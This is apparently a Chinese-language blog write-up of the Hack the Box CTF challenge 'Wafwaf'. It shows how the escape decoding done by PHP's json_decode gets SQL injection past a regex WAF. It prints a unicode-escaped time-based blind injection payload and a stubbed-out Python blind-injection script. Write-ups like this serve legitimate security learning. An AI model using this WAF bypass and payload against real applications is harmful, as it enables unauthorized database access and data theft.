---
title: "Hack the Box——Wafwaf"
date: 2020-09-15T18:23:03+08:00
showDate: true
draft: false
tags: ["security","hack the box", "ctf"]
categories: ["security"]
---

## 0x00

Wafwaf

## 0x01 初探

访问界面，简单明了，直接给了源码

![1.png](1.png)

那显然是要代码审计了。

简单看下代码，流程就是`从php://input获取数据`=>`waf函数验证是否有非法字符`=>`解析json数据`=>`执行sql`

## 0x02 分析

看了代码我觉得有问题的地方有

* 没过滤全sql关键字，还可以注入

* preg_match_all函数可能有问题，可能可以通过某种输入绕过正则

* php://input可能有漏洞

* json_decode函数可能有漏洞

## 0x03 寻找答案

带着可能出现的问题，一个一个去搜索

关于sql绕过的，看到了很多新姿势，但是基本没有绕过小括号`(`的，有两个可以绕过的。

* 一个是利用的`ORDER BY`,但是这个的by被注释了。

* 还有一个通过笛卡尔积来造成慢查询，类似于盲注，但是这里`in`也被过滤了，`join`就自然没法用了。

还有很多绕过的姿势，但是过滤这么多关键字的基本没有了，卒。

然后是关于preg_match_all函数，这个也有一些漏洞。

* 比如preg_match会绕过数组的匹配，也就是如果参数传入数组会直接返回false，但是在这道题是先读取字符串再过滤再解析json，所以并不可行。

* 还有是正则匹配回溯最大次数限制的，就是如果用的贪婪匹配`.*`，然后传入的字符过多超过回溯次数会返回false。但是这题也没有用贪婪匹配，卒。

同样，php伪协议也没有找到什么可行的漏洞。

最后一个是json_decode，这个函数一直是被我忽略的，因为尝试了在被过滤的字符串中插入`00`,`0a`这种来绕过正则检测，结果插入之后连json都没解析出来，就没再这方面想了。

## 0x04 找到答案

但是经过不断的搜索，我在[浅谈json参数解析对waf绕过的影响](https://xz.aliyun.com/t/306)这篇文章的评论区看到了一段代码，这下有种茅塞顿开的感觉

```
$json = '{"id":"\u6211\u7684\u0074\u0074\u0074\u0074"}';
var_dump(json_decode($json));
```

输出
```
object(stdClass)#1 (1) {
  ["id"]=>
  string(10) "我的tttt"
}
```

当输入的字符串中有unicode，用json_decode函数解析出来会解析回utf-8的字符串。

那是不是我这边把unicode作为输入传过去就不会被正则检测到并且还能解析出来了呢。

因为没有回显没有报错，只能试试基于时间盲注的payload

```
{
    "user": "\u0027\u0075\u006e\u0069\u006f\u006e\u0020\u0073\u0065\u006c\u0065\u0063\u0074\u0020\u0073\u006c\u0065\u0065\u0070\u0028\u0031\u0030\u0029\u0023"
}
```

这里的unicode代表的utf-8字符串为`'union select sleep(10)#`

用postman测了下，时间大于了10s

![2.png](2.png)


## 0x05 解决问题

理论上应该可以用sqlmap自定义tamper去跑的，但是这里我用的是自己写盲注脚本，花了我一晚上的时间。

```
# coding: utf-8
proxies = {
    "http": "http://127.0.0.1:8080"
}
SLEEP_TIME = 1

def make_payload_text(payload): // 构造payload（转unicode字符串）
    return text

def request_server(text): // 请求服务器返回响应时间
    return spend_time

def guess_text(payload: str, text_length=10, sleep_time=SLEEP_TIME): // 猜字符串内容
    return guess_text

def guess_length(payload, sleep_time=SLEEP_TIME): // 猜字符串长度
    return v

def guess_database(): // 猜数据库名
    return text

def guess_tables(database): // 猜表名
    # db_m8452
    return tables

def guess_table_col(table): // 猜列名
    return columns

def guess_data(table, columns): // 猜数据
  return data

if __name__ == '__main__':
    db = guess_database()
    tables = guess_tables(db)
    data = {}
    for table in tables:
        columns = guess_table_col(table)
        data_list = guess_data(table, columns)
        data[table] = {
            "columns": columns,
            "data": data_list
        }
    print(data)
```

这套代码如果以后遇到基于时间的盲注还可以复用，也不算太浪费吧。

最后脚本跑出来的结果

![3.png](3.png)

0x06 总结

因为一开始对这题没有任何思路，所以一直在google和百度，但是都没有找到解决办法，但是也乘机见识了很多新的姿势，比如各种绕过，还有那个最大回溯攻击等等。也不算太亏吧。